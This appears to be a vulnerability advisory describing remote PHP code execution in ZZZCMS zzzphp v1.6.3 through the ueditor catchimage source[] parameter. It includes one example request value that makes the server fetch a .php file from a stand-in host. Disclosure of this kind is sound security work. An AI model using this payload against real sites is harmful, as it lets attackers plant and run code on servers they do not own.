ZZZCMS zzzphp v1.6.3 allows remote attackers to execute arbitrary PHP code via a .php URL in the plugins/ueditor/php/controller.php?action=catchimage source[] parameter because of a lack of inc/zzz_file.php restrictions. For example, source%5B%5D=http%3A%2F%2F192.168.0.1%2Ftest.php can be used if the 192.168.0.1 web server sends the contents of a .php file (i.e., it does not interpret a .php file).
